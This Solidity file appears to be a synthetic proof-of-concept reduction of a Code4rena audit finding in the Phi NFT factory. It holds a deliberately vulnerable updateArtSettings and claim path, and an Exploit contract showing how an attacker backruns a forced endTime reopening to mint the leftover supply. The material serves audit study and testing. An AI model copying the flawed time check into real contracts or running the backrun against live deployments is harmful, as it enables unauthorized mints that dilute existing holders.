// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Phi — Forced endTime extension in updateArtSettings allows attacker to mint
    (Code4rena 2024-08-phi, finding #41090, H-04, reporter MrPotatoMagic)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    PhiFactory.updateArtSettings requires endTime_ >= block.timestamp
    (EndTimeInPast). After a mint event has already ended, an honest artist who
    only wants to update uri / soulBounded / royalties is forced to reopen the
    mint window by setting endTime to "now". Claim validation uses
    `if (block.timestamp > art.endTime) revert ArtEnded()` (strict >), so at
    timestamp == endTime minting still succeeds. An attacker who was eligible
    during the original event can therefore backrun the artist and mint leftover
    supply, diluting existing holders.

    Harm: post-event unauthorized mints of residual maxSupply after the artist
    is forced to reopen endTime.
//////////////////////////////////////////////////////////////////////////*/

/// @dev Minimal art receipt token (ERC-1155-like balances).
contract MockArt {
    mapping(address => mapping(uint256 => uint256)) public balanceOf;

    function mint(address to, uint256 id, uint256 amount) external {
        balanceOf[to][id] += amount;
    }
}

/// @notice Reduced PhiFactory — updateArtSettings + claim path.
contract PhiFactory {
    struct PhiArt {
        address creator;
        address receiver;
        address artAddress;
        uint256 maxSupply;
        uint256 mintFee;
        uint256 startTime;
        uint256 endTime;
        uint256 numberMinted;
        bool soulBounded;
        string uri;
    }

    mapping(uint256 => PhiArt) public arts;
    MockArt public immutable artToken;
    uint256 public nextArtId = 1;

    error InvalidAddressZero();
    error InvalidTimeRange();
    error EndTimeInPast();
    error ExceedMaxSupply();
    error ArtNotStarted();
    error ArtEnded();
    error InvalidQuantity();
    error OverMaxAllowedToMint();
    error NotCreator();

    constructor(MockArt artToken_) {
        artToken = artToken_;
    }

    /// @dev Seed an art whose mint window has already ended (endTime in the past).
    function seedEndedArt(
        address creator_,
        address receiver_,
        uint256 maxSupply_,
        uint256 numberMinted_,
        uint256 pastEndTime_,
        string memory uri_
    ) external returns (uint256 artId) {
        require(pastEndTime_ < block.timestamp, "seed: endTime must be past");
        require(numberMinted_ <= maxSupply_, "seed: minted > supply");
        artId = nextArtId++;
        PhiArt storage a = arts[artId];
        a.creator = creator_;
        a.receiver = receiver_;
        a.artAddress = address(artToken);
        a.maxSupply = maxSupply_;
        a.mintFee = 0;
        a.startTime = 0;
        a.endTime = pastEndTime_;
        a.numberMinted = numberMinted_;
        a.soulBounded = false;
        a.uri = uri_;
    }

    /// @dev Faithful reduction of PhiFactory.updateArtSettings (src/PhiFactory.sol).
    function updateArtSettings(
        uint256 artId_,
        string memory url_,
        address receiver_,
        uint256 maxSupply_,
        uint256 mintFee_,
        uint256 startTime_,
        uint256 endTime_,
        bool soulBounded_
    ) external {
        if (msg.sender != arts[artId_].creator) revert NotCreator();
        if (receiver_ == address(0)) {
            revert InvalidAddressZero();
        }

        if (endTime_ < startTime_) {
            revert InvalidTimeRange();
        }

        // @> VULN: after the mint event ended the artist is FORCED to set
        // endTime_ >= block.timestamp to update any other setting (uri, royalties, …),
        // reopening minting for at least the current block.
        // FIX: allow post-event updates of uri/soulBounded/royalties without touching
        // endTime, and/or use `>=` in ArtEnded so timestamp==endTime is closed.
        if (endTime_ < block.timestamp) {
            revert EndTimeInPast();
        }

        PhiArt storage art = arts[artId_];

        if (art.numberMinted > maxSupply_) {
            revert ExceedMaxSupply();
        }

        art.receiver = receiver_;
        art.maxSupply = maxSupply_;
        art.mintFee = mintFee_;
        art.startTime = startTime_;
        art.endTime = endTime_;
        art.soulBounded = soulBounded_;
        art.uri = url_;
    }

    /// @dev Reduced claim path (merkle eligibility abstracted — eligibility is not the bug).
    function claim(uint256 artId_, address minter_, uint256 quantity_) external {
        _validateAndUpdateClaimState(artId_, minter_, quantity_);
        artToken.mint(minter_, artId_, quantity_);
    }

    /// @dev Faithful reduction of _validateAndUpdateClaimState endTime gate.
    function _validateAndUpdateClaimState(uint256 artId_, address minter_, uint256 quantity_) private {
        PhiArt storage art = arts[artId_];

        if (block.timestamp < art.startTime) revert ArtNotStarted();
        // strict `>`: when endTime was just forced to block.timestamp, minting still passes
        if (block.timestamp > art.endTime) revert ArtEnded();
        if (quantity_ == 0) revert InvalidQuantity();
        if (art.numberMinted + quantity_ > art.maxSupply) revert OverMaxAllowedToMint();

        art.numberMinted += quantity_;
        minter_; // eligibility was verified off-path (merkle) in the real contract
    }

    function endTimeOf(uint256 artId_) external view returns (uint256) {
        return arts[artId_].endTime;
    }

    function numberMintedOf(uint256 artId_) external view returns (uint256) {
        return arts[artId_].numberMinted;
    }
}

contract Exploit {
    MockArt public artToken; // CREATE nonce 1
    PhiFactory public factory; // CREATE nonce 2

    address public constant ATTACKER = address(0xBEEF);
    uint256 public constant ART_ID = 1;
    uint256 public constant MAX_SUPPLY = 1000;
    uint256 public constant ALREADY_MINTED = 500;
    uint256 public constant EXTRA_MINT = 500; // residual supply the attacker snipes

    constructor() {
        artToken = new MockArt();
        factory = new PhiFactory(artToken);
        // Exploit is the honest artist. Mint window already over (endTime = 0).
        // 500 of 1000 already minted during the original event.
        // endTime=0 is strictly before any realistic block.timestamp (forge default is 1;
        // the Playground anvil stub uses ~1.7e9).
        factory.seedEndedArt(address(this), address(this), MAX_SUPPLY, ALREADY_MINTED, 0, "ipfs://old");
    }

    function run() external {
        // Precondition: minting is closed (timestamp > past endTime).
        try factory.claim(ART_ID, ATTACKER, 1) {
            revert("claim should fail while ended");
        } catch {}

        // Honest artist only wants to refresh the URI post-event, but must supply
        // endTime_ >= block.timestamp — reopening the window for this block.
        factory.updateArtSettings(
            ART_ID,
            "ipfs://new",
            address(this),
            MAX_SUPPLY,
            0,
            0,
            block.timestamp, // forced reopen
            false
        );

        require(factory.endTimeOf(ART_ID) == block.timestamp, "endTime not reopened");

        // Attacker backruns the update and mints the residual supply.
        factory.claim(ART_ID, ATTACKER, EXTRA_MINT);

        // HARM: unauthorized post-event mints diluting existing holders.
        require(artToken.balanceOf(ATTACKER, ART_ID) == EXTRA_MINT, "attacker did not mint residual");
        require(factory.numberMintedOf(ART_ID) == MAX_SUPPLY, "supply not fully sniped");
    }
}
